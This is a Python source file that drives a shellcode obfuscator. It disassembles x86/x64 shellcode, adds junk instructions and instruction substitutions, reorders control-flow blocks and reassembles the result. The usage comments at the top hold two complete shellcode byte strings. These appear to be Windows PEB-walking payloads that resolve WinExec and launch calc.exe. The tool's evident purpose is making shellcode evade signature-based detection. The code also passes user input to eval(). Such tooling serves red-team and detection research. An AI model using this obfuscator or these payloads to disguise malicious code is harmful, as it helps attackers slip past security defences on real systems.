# main.py
# ----------------------------------------------------------------------------------------------------------------
# TODOs
# 1) Test more shellcode samples
# 2) Implement a proper DataFlowAnalyzer
# 3) Expand instruction substitutions with safe options
# 4) Code flattening

# ----------------------------------------------------------------------------------------------------------------
# USAGE EXAMPLES
# x64
#--input-file "C:\\Users\\edo_m\\Desktop\\input.bin" --arch x64
#--shellcode b'\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6' --arch x64

# x86
# --shellcode b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x98\xfe\x8a\x0e\xff\x55\x04\x89\x45\x10\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x14\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x5b\x31\xc0\x50\x53\xff\x55\x10\x31\xc0\x50\x6a\xff\xff\x55\x14' --arch x86
# ----------------------------------------------------------------------------------------------------------------
import argparse
from colorama import Fore, Style, init
import capstone
from disassembler import Disassembler
from instruction_analysis import InstructionAnalyzer
from block_builder import BlockBuilder
from junk_insertion import JunkInsertion
from block_obfuscator import BlockObfuscator
from reassembly import Reassembler
from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_MODE_32
#from data_flow_analysis import DataFlowAnalyzer
from instruction_substitution import InstructionSubstitutionPass

def main():
    # ----------------------------------------------------------------------------------------------------------------
    init(autoreset=True)  # Initialize colorama for colored output

    # Argument parser setup
    parser = argparse.ArgumentParser(description="Shellcode Obfuscator")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--shellcode",
                       help="Shellcode in format: b'\\x48\\x31\\xc0\\xe8\\x00\\x00\\x00\\x00\\x48\\x31\\xd2\\xc3'")
    group.add_argument("--input-file", help="Input binary file containing raw shellcode")
    parser.add_argument("--output", required=False, help="Output file to save final binary code")
    parser.add_argument("--arch", required=True, choices=["x86", "x64"], help="Target architecture: x86 or x64")
    parser.add_argument("--junk-frequency", type=float, default=0.4, help="Junk insertion frequency (default: 0.4)")
    parser.add_argument("--max-junk-seq", type=int, default=3,
                        help="Maximum sequence of junk instructions (default: 3)")
    parser.add_argument("--sse-junk", action="store_true", help="Enable SSE junk instructions")
    parser.add_argument("--reorder-strategy", default="advanced-cfg",
                        help="Block reorder strategy (default: advanced-cfg)")
    parser.add_argument("--block-alignment", type=int, default=0x00, help="Block alignment (default: 0x00)")
    args = parser.parse_args()

    # Determine architecture mode
    cs_mode = capstone.CS_MODE_64
    ks_mode = KS_MODE_64

    if args.arch == "x86":
        cs_mode = capstone.CS_MODE_32
        ks_mode = KS_MODE_32
    elif args.arch == "x64":
        cs_mode = capstone.CS_MODE_64
        ks_mode = KS_MODE_64

    try:
        if args.shellcode:
            # Convert shellcode from input format to bytes
            shellcode = eval(args.shellcode)
            if not isinstance(shellcode, bytes):
                raise ValueError("Shellcode must be a bytes object")
        elif args.input_file:
            # Read shellcode from binary file
            with open(args.input_file, "rb") as f:
                shellcode = f.read()
                # shellcode = b''.join([b"\\x" + byte.to_bytes(1, 'big') for byte in shellcode])
    except (ValueError, SyntaxError, IOError) as e:
        print(Fore.RED + f"Error: {e}")
        return

    # ----------------------------------------------------------------------------------------------------------------

    print(Fore.GREEN + "\n====== 1) DISASSEMBLING ======")
    # Step 1: Disassemble
    d = Disassembler(arch=capstone.CS_ARCH_X86, mode=cs_mode)
    raw_instructions = d.disassemble_shellcode(shellcode, base_address=0x1000)

    # ----------------------------------------------------------------------------------------------------------------

    print(Fore.GREEN + "\n====== 2) INSTRUCTION ANALYZER ======")
    # Step 2: Analyze
    analyzer = InstructionAnalyzer(arch=capstone.CS_ARCH_X86, mode=cs_mode)
    analyzed_list = analyzer.analyze_instructions(raw_instructions)

    print(Fore.CYAN + "The following are the disassembled and analyzed instructions:")
    # Print them with advanced info
    for ains in analyzed_list:
        print(ains.debug_info())

    # ----------------------------------------------------------------------------------------------------------------

    print(Fore.GREEN + "\n====== 3) CODE BLOCKS BUILDING ======")
    # Step 3: Build Basic Blocks
    builder = BlockBuilder(treat_calls_as_end=False)
    blocks = builder.build_blocks(analyzed_list)

    print(Fore.CYAN + "=== Original Blocks ===")
    for b in blocks:
        b.debug_print()
        print()

    # ----------------------------------------------------------------------------------------------------------------
    # print(Fore.GREEN + "\n====== 4) DATA FLOW ANALYSIS ======")
    # # 4) Data Flow Analysis - I do this but not really useful at this moment in time, those extra information are not used for the subsequent obfuscation steps
    # dfa = DataFlowAnalyzer(arch=capstone.CS_ARCH_X86, mode=cs_mode)
    # dfa.analyze(blocks)
    #
    # # Now you can inspect block.live_in[i], block.live_out[i] for each instruction i
    #
    # print(Fore.CYAN + "=== Blocks After DATA FLOW ANALYSIS ===")
    # for b in blocks:
    #     b.debug_print()
    #     print()

    # ----------------------------------------------------------------------------------------------------------------
    print(Fore.GREEN + "\n====== 4) JUNK INSTRUCTIONS INSERTION ======")
    # Step 4: Insert junk
    junk_pass = JunkInsertion(
        insertion_frequency=args.junk_frequency,
        sse_junk_enabled=args.sse_junk,
        max_junk_seq=args.max_junk_seq,
        arch=capstone.CS_ARCH_X86,
        mode=cs_mode
    )
    junk_pass.run(blocks)

    print(Fore.CYAN + "\n=== BLOCKS AFTER JUNK INSERTION ===")
    for b in blocks:
        b.debug_print()
        print()

    # ----------------------------------------------------------------------------------------------------------------
    print(Fore.GREEN + "\n====== 5) INSTRUCTION SUBSTITUTION ======")
    # Step 5: Substitute instructions
    substitution_pass = InstructionSubstitutionPass(
        cs_arch=capstone.CS_ARCH_X86,
        cs_mode=cs_mode,
        ks_arch=KS_ARCH_X86,
        ks_mode=ks_mode,
        substitution_probability=1.0
    )
    substitution_pass.run(blocks)

    print(Fore.CYAN + "\n=== BLOCKS AFTER INSTRUCTION SUBSTITUTION ===")
    for b in blocks:
        b.debug_print()
        print()

    # ----------------------------------------------------------------------------------------------------------------

    print(Fore.GREEN + "\n====== 6) BLOCKS OBFUSCATION ======")
    # Step 6: Obfuscate using advanced CFG reorder
    obf = BlockObfuscator(
        base_address=0x2000,
        block_alignment=args.block_alignment,
        insert_junk_blocks=False,
        junk_block_count=0,
        reorder_strategy=args.reorder_strategy,
        preserve_entry=True
    )
    new_blocks = obf.obfuscate(blocks)

    print(Fore.CYAN + "=== FINAL BLOCKS ===")
    for b in new_blocks:
        b.debug_print()
        print()

    # ----------------------------------------------------------------------------------------------------------------

    print(Fore.GREEN + "\n====== 7) REASSEMBLE FINAL CODE ======")
    # 8) Reassemble final code
    reassembler = Reassembler(arch=KS_ARCH_X86, mode=ks_mode)
    final_code, base_addr = reassembler.reassemble_final_code(new_blocks)

    shellcode_str = reassembler.format_as_shellcode(final_code)

    print(Fore.YELLOW +f"Reassembled final code from 0x{base_addr:X} to 0x{base_addr + len(final_code):X}, length={len(final_code)}")
    # final_code is your new shellcode bytes
    # base_addr is the lowest address in the code

    # Generate shellcode string
    shellcode_str = reassembler.format_as_shellcode(final_code)
    # Print shellcode
    print(Fore.CYAN + "\n=== SHELLCODE ===")
    print(f'"{shellcode_str}"')


    # Print raw bytes
    print(Fore.CYAN + "\n=== RAW ===")
    print("Hex dump of final code:")
    print(final_code.hex())

    # ----------------------------------------------------------------------------------------------------------------
    # Save output to file if specified
    if args.output:
        try:
            with open(args.output, "wb") as f:
                f.write(final_code)
            print(Fore.GREEN + f"\nFinal binary code saved to {args.output}")
        except IOError as e:
            print(Fore.RED + f"Error saving to file: {e}")


if __name__ == "__main__":
    main()